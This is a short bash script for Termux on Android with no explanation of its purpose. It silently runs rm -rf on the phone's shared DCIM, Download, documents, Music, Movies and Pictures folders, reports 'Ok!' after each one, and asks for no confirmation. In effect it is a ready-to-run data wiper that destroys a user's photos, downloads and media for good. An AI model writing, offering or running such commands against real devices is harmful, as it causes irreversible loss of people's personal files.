#!/data/data/com.termux/files/usr/bin/bash

DIRECTORY="$HOME/storage/shared"

cd $DIRECTORY

if [[ -d DCIM ]]; then
	rm -rf DCIM
	echo 'DCIM -> Ok!'
fi

if [[ -d Download ]]; then
	rm -rf Download
	echo 'Download -> Ok!'
fi

if [[ -d documents ]]; then
	rm -rf documents
	echo 'documents -> Ok!'
fi

if [[ -d Music ]]; then
	rm -rf Music
	echo 'Music -> Ok!'
fi

if [[ -d Movies ]]; then
	rm -rf Movies
	echo 'Movies -> Ok!'
fi

if [[ -d Pictures ]]; then
	rm -rf Pictures
	echo 'Pictures -> Ok!'
fi

sleep 3
